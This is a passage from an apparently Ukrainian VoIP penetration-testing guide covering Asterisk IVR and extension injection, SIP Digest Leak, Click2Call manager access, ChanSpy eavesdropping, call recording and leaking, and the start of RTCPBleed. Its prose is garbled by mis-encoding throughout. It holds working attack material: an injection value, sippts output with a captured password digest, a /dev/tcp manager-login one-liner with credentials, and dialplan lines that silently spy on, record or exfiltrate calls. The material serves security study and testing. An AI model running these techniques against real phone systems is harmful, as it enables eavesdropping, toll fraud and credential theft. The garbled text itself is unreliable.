3. **–ú–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—è –¥–∑–≤—ñ–Ω–∫—ñ–≤**: –ù–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –¥–∑–≤—ñ–Ω–∫—ñ–≤ –¥–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ–≥–æ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–Ω—è, —Ç–∞–∫–æ–≥–æ —è–∫ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –≤—ñ–¥–¥—ñ–ª–∏, –∞–≥–µ–Ω—Ç–∏ –∞–±–æ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
4. **–ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**: –ó–±—ñ—Ä —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤—ñ–¥ –∞–±–æ–Ω–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–æ—ó —è–∫ –Ω–æ–º–µ—Ä–∏ —Ä–∞—Ö—É–Ω–∫—ñ–≤, ID —Å–ø—Ä–∞–≤ –∞–±–æ –±—É–¥—å-—è–∫—ñ —ñ–Ω—à—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ –¥–∞–Ω—ñ.
5. **–Ü–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –∑ –∑–æ–≤–Ω—ñ—à–Ω—ñ–º–∏ —Å–∏—Å—Ç–µ–º–∞–º–∏**: –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è —Å–∏—Å—Ç–µ–º–∏ IVR –¥–æ –±–∞–∑ –¥–∞–Ω–∏—Ö –∞–±–æ —ñ–Ω—à–∏—Ö –ø—Ä–æ–≥—Ä–∞–º–Ω–∏—Ö —Å–∏—Å—Ç–µ–º –¥–ª—è –¥–æ—Å—Ç—É–ø—É –∞–±–æ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥—ñ–π –∞–±–æ —ñ–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è –ø–æ–¥—ñ–π.

–£ —Å–∏—Å—Ç–µ–º—ñ VoIP Asterisk –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ IVR, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø–ª–∞–Ω –Ω–∞–±–æ—Ä—É (**`extensions.conf`** —Ñ–∞–π–ª) —Ç–∞ —Ä—ñ–∑–Ω—ñ –ø—Ä–æ–≥—Ä–∞–º–∏, —Ç–∞–∫—ñ —è–∫ `Background()`, `Playback()`, `Read()` —Ç–∞ —ñ–Ω—à—ñ. –¶—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –¥–æ–ø–æ–º–∞–≥–∞—é—Ç—å –≤–∞–º –≤—ñ–¥—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –≥–æ–ª–æ—Å–æ–≤—ñ –ø—ñ–¥–∫–∞–∑–∫–∏, –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –ø–æ—Ç—ñ–∫ –¥–∑–≤—ñ–Ω–∫—ñ–≤.

#### –ü—Ä–∏–∫–ª–∞–¥ –≤—Ä–∞–∑–ª–∏–≤–æ—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
–ü–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –ø—Ä–∏–∫–ª–∞–¥, –¥–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—Ä–æ—Å—è—Ç—å **–Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ 1, —â–æ–± –∑–∞—Ç–µ–ª–µ—Ñ–æ–Ω—É–≤–∞—Ç–∏** –≤ –≤—ñ–¥–¥—ñ–ª, **2, —â–æ–± –∑–∞—Ç–µ–ª–µ—Ñ–æ–Ω—É–≤–∞—Ç–∏** –≤ —ñ–Ω—à–∏–π, –∞–±–æ **–ø–æ–≤–Ω–∏–π –Ω–æ–º–µ—Ä**, —è–∫—â–æ –≤—ñ–Ω –π–æ–≥–æ –∑–Ω–∞—î.\
–í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤–∫–∞–∑–∞–Ω–∞ **–¥–æ–≤–∂–∏–Ω–∞ –Ω–æ–º–µ—Ä–∞ –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è, —Ç–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –≤–≤–µ—Å—Ç–∏ 5-—Å–µ–∫—É–Ω–¥–Ω–∏–π —Ç–∞–π–º-–∞—É—Ç –ø–æ–≤–Ω–æ–≥–æ –Ω–æ–º–µ—Ä–∞, —ñ –≤—ñ–Ω –±—É–¥–µ –Ω–∞–±—Ä–∞–Ω–∏–π.**

### –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –Ω–æ–º–µ—Ä–∞

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–æ–º–µ—Ä, —Ç–∞–∫–∏–π —è–∫:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
–î–µ **`${EXTEN}`** —î **–≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–º –Ω–æ–º–µ—Ä–æ–º**, —è–∫–∏–π –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–∏–π, –∫–æ–ª–∏ **–≤–≤–µ–¥–µ–Ω–æ ext 101**, —Ü–µ —Ç–µ, —â–æ —Å—Ç–∞–Ω–µ—Ç—å—Å—è:
```scss
exten => 101,1,Dial(SIP/101)
```
–û–¥–Ω–∞–∫, —è–∫—â–æ **`${EXTEN}`** –¥–æ–∑–≤–æ–ª—è—î –≤–≤–æ–¥–∏—Ç–∏ **–±—ñ–ª—å—à–µ –Ω—ñ–∂ —Ü–∏—Ñ—Ä–∏** (—è–∫ —É —Å—Ç–∞—Ä—ñ—à–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö Asterisk), –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–≤–µ—Å—Ç–∏ **`101&SIP123123123`**, —â–æ–± –∑–∞—Ç–µ–ª–µ—Ñ–æ–Ω—É–≤–∞—Ç–∏ –Ω–∞ –Ω–æ–º–µ—Ä 123123123. –Ü —Ü–µ –±—É–¥–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
–¢–æ–º—É –¥–∑–≤—ñ–Ω–æ–∫ –Ω–∞ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è **`101`** —Ç–∞ **`123123123`** –±—É–¥–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ, —ñ –ª–∏—à–µ –ø–µ—Ä—à–∏–π, —Ö—Ç–æ –æ—Ç—Ä–∏–º–∞–≤ –¥–∑–≤—ñ–Ω–æ–∫, –±—É–¥–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ... –∞–ª–µ —è–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, —è–∫–µ –æ–±—Ö–æ–¥–∏—Ç—å –±—É–¥—å-—è–∫–µ –∑—ñ—Å—Ç–∞–≤–ª–µ–Ω–Ω—è**, —è–∫–µ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è, –∞–ª–µ –Ω–µ —ñ—Å–Ω—É—î, –≤—ñ–Ω –º–æ–∂–µ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –¥–∑–≤—ñ–Ω–æ–∫ –ª–∏—à–µ –Ω–∞ –±–∞–∂–∞–Ω–∏–π –Ω–æ–º–µ—Ä**.

## –£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å SIPDigestLeak

–£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å SIP Digest Leak –≤–ø–ª–∏–≤–∞—î –Ω–∞ –≤–µ–ª–∏–∫—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å SIP —Ç–µ–ª–µ—Ñ–æ–Ω—ñ–≤, –≤–∫–ª—é—á–∞—é—á–∏ —è–∫ –∞–ø–∞—Ä–∞—Ç–Ω—ñ, —Ç–∞–∫ —ñ –ø—Ä–æ–≥—Ä–∞–º–Ω—ñ IP —Ç–µ–ª–µ—Ñ–æ–Ω–∏, –∞ —Ç–∞–∫–æ–∂ —Ç–µ–ª–µ—Ñ–æ–Ω–Ω—ñ –∞–¥–∞–ø—Ç–µ—Ä–∏ (VoIP –¥–æ –∞–Ω–∞–ª–æ–≥–æ–≤–∏—Ö). –£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª—è—î **–≤–∏—Ç–æ–∫—É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é Digest**, —è–∫–∞ –æ–±—á–∏—Å–ª—é—î—Ç—å—Å—è –∑ –ø–∞—Ä–æ–ª—è. **–û—Ñ–ª–∞–π–Ω-–∞—Ç–∞–∫–∞ –Ω–∞ –ø–∞—Ä–æ–ª—å —Å—Ç–∞—î –º–æ–∂–ª–∏–≤–æ—é** —ñ –º–æ–∂–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ –±—ñ–ª—å—à—ñ—Å—Ç—å –ø–∞—Ä–æ–ª—ñ–≤ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –Ω–∞ –≤–∏–∫–ª–∏–∫.

**[–°—Ü–µ–Ω–∞—Ä—ñ–π —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∑–≤—ñ–¥—Å–∏**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP —Ç–µ–ª–µ—Ñ–æ–Ω (–∂–µ—Ä—Ç–≤–∞) —Å–ª—É—Ö–∞—î –Ω–∞ –±—É–¥—å-—è–∫–æ–º—É –ø–æ—Ä—Ç—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥: 5060), –ø—Ä–∏–π–º–∞—é—á–∏ —Ç–µ–ª–µ—Ñ–æ–Ω–Ω—ñ –¥–∑–≤—ñ–Ω–∫–∏
2. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–∞–¥—Å–∏–ª–∞—î INVITE –Ω–∞ IP —Ç–µ–ª–µ—Ñ–æ–Ω
3. –¢–µ–ª–µ—Ñ–æ–Ω –∂–µ—Ä—Ç–≤–∏ –ø–æ—á–∏–Ω–∞—î –¥–∑–≤–æ–Ω–∏—Ç–∏, —ñ —Ö—Ç–æ—Å—å –ø—ñ–¥–Ω—ñ–º–∞—î —Å–ª—É—Ö–∞–≤–∫—É —ñ –∫–ª–∞–¥–µ —Ç—Ä—É–±–∫—É (–æ—Å–∫—ñ–ª—å–∫–∏ –Ω—ñ—Ö—Ç–æ –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω –Ω–∞ —ñ–Ω—à–æ–º—É –∫—ñ–Ω—Ü—ñ)
4. –ö–æ–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω –∫–ª–∞–¥–µ —Ç—Ä—É–±–∫—É, **—Ç–µ–ª–µ—Ñ–æ–Ω –∂–µ—Ä—Ç–≤–∏ –Ω–∞–¥—Å–∏–ª–∞—î BYE –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É**
5. **–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏–¥–∞—î –≤—ñ–¥–ø–æ–≤—ñ–¥—å 407**, —è–∫–∞ **–ø–∏—Ç–∞—î –ø—Ä–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é** —ñ –≤–∏–¥–∞—î –≤–∏–∫–ª–∏–∫ –Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é
6. **–¢–µ–ª–µ—Ñ–æ–Ω –∂–µ—Ä—Ç–≤–∏ –Ω–∞–¥–∞—î –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –≤–∏–∫–ª–∏–∫ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** –≤ –¥—Ä—É–≥–æ–º—É BYE
7. **–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ —Ç–æ–¥—ñ –∑–¥—ñ–π—Å–Ω–∏—Ç–∏ –∞—Ç–∞–∫—É –º–µ—Ç–æ–¥–æ–º –≥—Ä—É–±–æ—ó —Å–∏–ª–∏** –Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –≤–∏–∫–ª–∏–∫ –Ω–∞ —Å–≤–æ—î–º—É –ª–æ–∫–∞–ª—å–Ω–æ–º—É –∫–æ–º–ø'—é—Ç–µ—Ä—ñ (–∞–±–æ —Ä–æ–∑–ø–æ–¥—ñ–ª–µ–Ω—ñ–π –º–µ—Ä–µ–∂—ñ —Ç–æ—â–æ) —ñ –≤–≥–∞–¥–∞—Ç–∏ –ø–∞—Ä–æ–ª—å

* **SIPPTS leak** –∑ [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS leak –µ–∫—Å–ø–ª—É–∞—Ç—É—î —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å SIP Digest Leak, —è–∫–∞ –≤–ø–ª–∏–≤–∞—î –Ω–∞ –≤–µ–ª–∏–∫—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å SIP —Ç–µ–ª–µ—Ñ–æ–Ω—ñ–≤. –í–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ –º–æ–∂–Ω–∞ –∑–±–µ—Ä–µ–≥—Ç–∏ —É —Ñ–æ—Ä–º–∞—Ç—ñ SipCrack –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é SIPPTS dcrack –∞–±–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call –¥–æ–∑–≤–æ–ª—è—î **–≤–µ–±-–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É** (—è–∫–∏–π, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –º–æ–∂–µ –±—É—Ç–∏ –∑–∞—Ü—ñ–∫–∞–≤–ª–µ–Ω–∏–π —É –ø—Ä–æ–¥—É–∫—Ç—ñ) **–≤–≤–µ—Å—Ç–∏** —Å–≤—ñ–π **–Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É**, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–∑–≤—ñ–Ω–æ–∫. –ü–æ—Ç—ñ–º –±—É–¥–µ –∑–¥—ñ–π—Å–Ω–µ–Ω–æ –¥–∑–≤—ñ–Ω–æ–∫ –Ω–∞ –∫–æ–º–µ—Ä—Ü—ñ–π–Ω–∏–π –Ω–æ–º–µ—Ä, —ñ –∫–æ–ª–∏ –≤—ñ–Ω **–ø—ñ–¥–Ω—ñ–º–µ —Å–ª—É—Ö–∞–≤–∫—É**, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –±—É–¥–µ **–∑–∞—Ç–µ–ª–µ—Ñ–æ–Ω–æ–≤–∞–Ω–∏–π —ñ –∑'—î–¥–Ω–∞–Ω–∏–π –∑ –∞–≥–µ–Ω—Ç–æ–º**.

–ó–≤–∏—á–∞–π–Ω–∏–π –ø—Ä–æ—Ñ—ñ–ª—å Asterisk –¥–ª—è —Ü—å–æ–≥–æ –≤–∏–≥–ª—è–¥–∞—î —Ç–∞–∫:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* –ü–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –ø—Ä–æ—Ñ—ñ–ª—å –¥–æ–∑–≤–æ–ª—è—î **–±—É–¥—å-—è–∫—ñ–π IP-–∞–¥—Ä–µ—Å—ñ –ø—ñ–¥–∫–ª—é—á–∞—Ç–∏—Å—è** (—è–∫—â–æ –≤—ñ–¥–æ–º–∞ –ø–∞—Ä–æ–ª—å).
* –î–ª—è **–æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó –¥–∑–≤—ñ–Ω–∫–∞**, —è–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ —Ä–∞–Ω—ñ—à–µ, **–Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –ø—Ä–∞–≤–∞ –Ω–∞ —á–∏—Ç–∞–Ω–Ω—è** —ñ **—Ç—ñ–ª—å–∫–∏** **originate** –≤ **–∑–∞–ø–∏—Å—É**.

–ó —Ü–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏ –±—É–¥—å-—è–∫–∞ IP-–∞–¥—Ä–µ—Å–∞, —â–æ –∑–Ω–∞—î –ø–∞—Ä–æ–ª—å, –º–æ–∂–µ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è —ñ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ –∑–∞–Ω–∞–¥—Ç–æ –±–∞–≥–∞—Ç–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —è–∫: 

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∞–±–æ –¥—ñ–π –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–ø–∏—Ç–∞–Ω–æ.**

### **–ü—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è**

–í Asterisk –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É **`ChanSpy`**, –≤–∫–∞–∑—É—é—á–∏ **—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è(—è) –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É** (–∞–±–æ –≤—Å—ñ –∑ –Ω–∏—Ö), —â–æ–± —á—É—Ç–∏ —Ä–æ–∑–º–æ–≤–∏, —è–∫—ñ –≤—ñ–¥–±—É–≤–∞—é—Ç—å—Å—è. –¶—é –∫–æ–º–∞–Ω–¥—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø—Ä–∏–∑–Ω–∞—á–∏—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—é.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, **`exten => 333,1,ChanSpy('all',qb)`** –≤–∫–∞–∑—É—î, —â–æ —è–∫—â–æ –≤–∏ **–∑–∞—Ç–µ–ª–µ—Ñ–æ–Ω—É—î—Ç–µ** –Ω–∞ **—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è 333**, –≤–æ–Ω–æ –±—É–¥–µ **–º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç–∏** **`–≤—Å—ñ`** —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è, **–ø–æ—á–Ω–µ —Å–ª—É—Ö–∞—Ç–∏** —â–æ—Ä–∞–∑—É, –∫–æ–ª–∏ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –Ω–æ–≤–∞ —Ä–æ–∑–º–æ–≤–∞ (**`b`**) –≤ —Ç–∏—Ö–æ–º—É —Ä–µ–∂–∏–º—ñ (**`q`**), –æ—Å–∫—ñ–ª—å–∫–∏ –º–∏ –Ω–µ —Ö–æ—á–µ–º–æ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –Ω–µ—é. –í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç–∏ –≤—ñ–¥ –æ–¥–Ω—ñ—î—ó —Ä–æ–∑–º–æ–≤–∏ –¥–æ —ñ–Ω—à–æ—ó, –Ω–∞—Ç–∏—Å–∫–∞—é—á–∏ **`*`**, –∞–±–æ –Ω–∞–±–∏—Ä–∞—é—á–∏ –Ω–æ–º–µ—Ä —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è.

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`ExtenSpy`** –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –ª–∏—à–µ –æ–¥–Ω–æ–≥–æ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è.

–ó–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± —Å–ª—É—Ö–∞—Ç–∏ —Ä–æ–∑–º–æ–≤–∏, –º–æ–∂–ª–∏–≤–æ **–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —ó—Ö —É —Ñ–∞–π–ª–∏**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–∞–∫–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è: 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

–î–∑–≤—ñ–Ω–∫–∏ –±—É–¥—É—Ç—å –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤ **`/tmp`**.

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ Asterisk **–≤–∏–∫–æ–Ω–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç, —è–∫–∏–π –≤–∏—Ç–µ—á–µ –¥–∑–≤—ñ–Ω–æ–∫** –ø—ñ—Å–ª—è –π–æ–≥–æ –∑–∞–∫—Ä–∏—Ç—Ç—è.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### –£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å RTCPBleed

**RTCPBleed** —î —Å–µ—Ä–π–æ–∑–Ω–æ—é –ø—Ä–æ–±–ª–µ–º–æ—é –±–µ–∑–ø–µ–∫–∏, —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ VoIP-—Å–µ—Ä–≤–µ—Ä–∏ –Ω–∞ –±–∞–∑—ñ Asterisk (–æ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω–æ –≤ 2017 —Ä–æ—Ü—ñ). –£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª—è—î **RTP (Real Time Protocol) —Ç—Ä–∞—Ñ—ñ–∫—É**, —è–∫–∏–π –Ω–µ—Å–µ VoIP-—Ä–æ–∑–º–æ–≤–∏, **–ø–µ—Ä–µ—Ö–æ–ø–ª—é–≤–∞—Ç–∏—Å—è —Ç–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç–∏—Å—è –±—É–¥—å-–∫–∏–º –≤ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ**. –¶–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Ç–æ–º—É, —â–æ RTP-—Ç—Ä–∞—Ñ—ñ–∫ –æ–±—Ö–æ–¥–∏—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –ø—Ä–∏ –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ NAT (Network Address Translation) –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∏.

RTP-–ø—Ä–æ–∫—Å—ñ –Ω–∞–º–∞–≥–∞—é—Ç—å—Å—è –≤–∏—Ä—ñ—à–∏—Ç–∏ **–æ–±–º–µ–∂–µ–Ω–Ω—è NAT**, —â–æ –≤–ø–ª–∏–≤–∞—é—Ç—å –Ω–∞ RTC-—Å–∏—Å—Ç–µ–º–∏, –ø—Ä–æ–∫—Å—É—é—á–∏ RTP-–ø–æ—Ç–æ–∫–∏ –º—ñ–∂ –¥–≤–æ–º–∞ –∞–±–æ –±—ñ–ª—å—à–µ —Å—Ç–æ—Ä–æ–Ω–∞–º–∏. –ö–æ–ª–∏ NAT –∞–∫—Ç–∏–≤–Ω–∏–π, –ø—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è RTP-–ø—Ä–æ–∫—Å—ñ —á–∞—Å—Ç–æ –Ω–µ –º–æ–∂–µ –ø–æ–∫–ª–∞–¥–∞—Ç–∏—Å—è –Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ IP —Ç–∞ –ø–æ—Ä—Ç RTP, –æ—Ç—Ä–∏–º–∞–Ω—É —á–µ—Ä–µ–∑ —Å–∏–≥–Ω–∞–ª—ñ–∑–∞—Ü—ñ—é (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, SIP). –¢–æ–º—É —Ä—è–¥ RTP-–ø—Ä–æ–∫—Å—ñ —Ä–µ–∞–ª—ñ–∑—É–≤–∞–ª–∏ –º–µ—Ö–∞–Ω—ñ–∑–º, –¥–µ —Ç–∞–∫–∏–π **IP —Ç–∞ –ø–æ—Ä—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–≤—á–∞—é—Ç—å—Å—è**. –¶–µ —á–∞—Å—Ç–æ —Ä–æ–±–∏—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –≤—Ö—ñ–¥–Ω–æ–≥–æ RTP-—Ç—Ä–∞—Ñ—ñ–∫—É —Ç–∞ –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è IP —Ç–∞ –ø–æ—Ä—Ç—É –¥–∂–µ—Ä–µ–ª–∞ –¥–ª—è –±—É–¥—å-—è–∫–æ–≥–æ –≤—Ö—ñ–¥–Ω–æ–≥–æ RTP-—Ç—Ä–∞—Ñ—ñ–∫—É —è–∫ —Ç–æ–≥–æ, –Ω–∞ —è–∫–∏–π —Å–ª—ñ–¥ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏. –¶–µ–π –º–µ—Ö–∞–Ω—ñ–∑–º, —è–∫–∏–π –º–æ–∂–µ –Ω–∞–∑–∏–≤–∞—Ç–∏—Å—è "—Ä–µ–∂–∏–º –Ω–∞–≤—á–∞–Ω–Ω—è", **–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∂–æ–¥–Ω–æ–≥–æ –≤–∏–¥—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó**. –¢–æ–º—É **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏** –º–æ–∂—É—Ç—å **–Ω–∞–¥—Å–∏–ª–∞—Ç–∏ RTP-—Ç—Ä–∞—Ñ—ñ–∫ –¥–æ RTP-–ø—Ä–æ–∫—Å—ñ** —Ç–∞ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –ø—Ä–æ–∫—Å–æ–≤–∞–Ω–∏–π 